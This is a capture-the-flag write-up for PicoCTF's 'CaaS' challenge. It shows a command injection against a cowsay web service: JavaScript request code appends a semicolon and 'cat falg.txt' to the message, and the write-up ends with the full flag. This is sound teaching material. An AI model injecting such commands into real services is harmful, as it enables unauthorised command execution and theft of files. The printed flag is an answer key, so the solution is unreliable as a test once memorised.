# PicoCTF

## Web Exploitation

### CaaS
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/5fbb2dc5-3a06-4028-a3f3-aa62e80031ec)
<br>
Made an XML HTTP request to the URL.
We can do this inside the console itself.

```javascript
var request = function(message) {
    const xhr = new XMLHttpRequest();
    xhr.open("GET", "https://caas.mars.picoctf.net/cowsay/"+message);
    xhr.send();
    xhr.responseType = "text";
    xhr.onload = () => {
    if (xhr.readyState == 4 && xhr.status == 200) {
        const data = xhr.response;
        console.log(data);
    } else {
        console.log(`Error: ${xhr.status}`);
    }
    };
};

request("somerandommessage")
```
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/914122ac-6492-43b6-83db-f089519cc5f9)
<br>
The request is visible to be successful with a status 304.
<br>
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/b1365e04-0da6-4222-8e3a-bf88e1bc9214)
<br>
Amazingly enough, the server is directly executing the text put in the URL. Adding a semicolon at the end of the message text will let me execute a command after it. A snippet from the provided ``index.js`` file -
<br>
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/f6303078-ba02-4d57-a35c-ff4a2772fdd5)
<br>
I tried making a script to run a command but a CORS policy 'No-Access-Control-Origin' error came. Apparently only requests from the same origin are allowed. So I'll have to continue to use the browser console or just enter the URLs directly.
<br>
I try to see all the files present in the directory -
<br>
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/ec3d400a-38b2-40d1-a79d-9f6bcb906f42)
<br>
Out of these, only ``falg.txt`` seems to contain the flag present. So I run ``cat falg.txt`` -
<br>
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/bb9fbe7b-e0dd-4761-8a04-52fcfcf904ba)
<br>
The equivalent of the above would be to execute the following in the console - 
```javascript
var request = function(message) {
    const xhr = new XMLHttpRequest();
    xhr.open("GET", "https://caas.mars.picoctf.net/cowsay/"+message);
    xhr.send();
    xhr.responseType = "text";
    xhr.onload = () => {
    if (xhr.readyState == 4 && xhr.status == 200) {
        const data = xhr.response;
        console.log(data);
    } else {
        console.log(`Error: ${xhr.status}`);
    }
    };
};

request("a;cat falg.txt")
```
![image](https://github.com/codegallivant/cryptonite-taskphase/assets/27366422/e9c02879-017a-4f32-ac4c-f25376ff0a81)
<br>
<br>
**Flag obtained:** ``picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}``

